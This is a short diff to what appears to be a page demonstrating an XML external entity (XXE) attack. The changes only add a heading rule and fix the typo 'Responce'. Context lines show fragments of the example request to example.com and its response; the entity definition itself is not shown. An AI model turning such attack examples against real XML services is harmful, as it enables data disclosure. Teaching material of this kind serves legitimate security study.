@@ -1,5 +1,5 @@
 XXE Attack Example
-
+---------------
 Request
 ``````xml
 POST http://example.com/xml HTTP/1.1
@@ -13,7 +13,7 @@ POST http://example.com/xml HTTP/1.1
   &bar;
 </foo>
 ``````
-Responce
+Response
 ``````xml
 HTTP/1.0 200 OK
  
